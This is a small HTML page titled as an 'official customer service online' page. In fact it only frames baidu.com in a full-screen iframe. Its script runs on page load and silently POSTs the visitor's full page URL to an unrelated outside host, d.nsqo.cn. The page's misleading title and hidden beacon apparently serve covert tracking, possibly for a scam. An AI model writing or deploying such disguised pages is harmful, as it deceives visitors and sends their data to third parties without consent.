<!DOCTYPE html>
<html>
<head>
    <title>官方客服在线</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">

 </head>
<style>
    body, html {
        width: 100%;
        height: 100%
    }

    * {
        margin: 0;
        padding: 0
    }
</style>
<body>
<iframe id="dynamicIframe" width="100%" style="height:100%;border: 0;"></iframe>
<script>
    function loadDynamicContent() {
        var iframe = document.getElementById('dynamicIframe');
        iframe.src = "https://www.baidu.com/";
        
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "//d.nsqo.cn/api.php", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("url=" + encodeURIComponent(window.location.href)+'&port='+iframe.src);
    }

    // 当页面加载完成时调用加载函数
    window.onload = loadDynamicContent;
</script>
</body>
</html>
